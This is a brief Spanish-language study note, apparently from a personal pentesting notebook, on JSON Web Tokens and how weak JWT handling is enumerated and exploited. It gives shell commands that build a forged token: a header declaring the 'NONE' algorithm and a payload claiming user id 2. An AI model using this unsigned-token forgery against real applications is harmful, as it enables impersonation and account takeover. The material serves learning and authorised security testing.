___
- tags: #owasp #jwt
___
## JWT - Json Web Token
Son un tipo de token utilizado en la **autenticación** y **autorización** de usuarios en aplicaciones web. 
JWT es un estándar abierto (**RFC 7519**) que define un formato compacto y seguro para transmitir información entre diferentes partes de forma confiable.
## Fase de enumeración y explotación de JWT
Se produce cuando el atacante es capaz de obtener información sobre los JWT que se utilizan en la aplicación, lo que podría permitir al atacante explotar las debilidades en la autenticación y autorización de la aplicación.

## Partes del JWT
![[Pasted image 20251010161812.png]]

## Armando nuestro JWT
### Header
```shell
echo -n '{"alg":"NONE","typ":"JWT"}' | openssl base64 -e -A | tr '+/' '-_' | tr -d '='
```

### Payload
```shell
echo -n '{"id":2,"iat":1760124875,"exp":1760128475}' | openssl base64 -e -A | tr '+/' '-_' | tr -d '='
```